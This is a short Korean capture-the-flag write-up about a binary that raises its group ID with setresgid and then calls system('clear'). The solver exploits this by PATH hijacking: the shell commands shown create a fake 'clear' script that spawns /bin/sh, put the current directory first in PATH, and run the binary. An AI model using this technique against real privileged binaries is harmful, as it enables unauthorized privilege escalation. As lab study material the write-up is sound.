# Problem Overview

ssh 접속정보와, chal이라는 이진파일이 주어짐.
chal, flag 파일이 홈디렉토리에 존재하며, 권한이 없어 flag파일에 접근할 수 없음.

# Analysis

chal 파일을 리버싱한 결과 `setresgid(1001,1001,1001)`를 통해 프로세스가 실행 중 flag파일의 접근권한인 1001 gid를 부여받을 수 있고, `system("clear")`을 통해서 명령어가 실행되는 부분을 확인함.

> 실행파일을 리버싱하여, `setresgid()`가 적용된 프로세스의 `system()` 취약점을 확인하고 문제를 해결하라는 것으로 보임

# Exploitation Strategy

`system("clear")`의 실행이 `/bin/bash clear`로 환경변수를 통해 찾아 실행되기 때문에 환경변수가 적용되는 순서를 바꿔 clear의 이름을 가장한 셸 접근 프로그램으로 PATH 하이재킹하여 해결할 수 있을 것으로 판단함.

# Execution

```bash
echo '#!/bin/sh' > clear
echo '/bin/sh' >> clear
chmod +x clear

export PATH=.:$PATH

./chal
```

# Flag
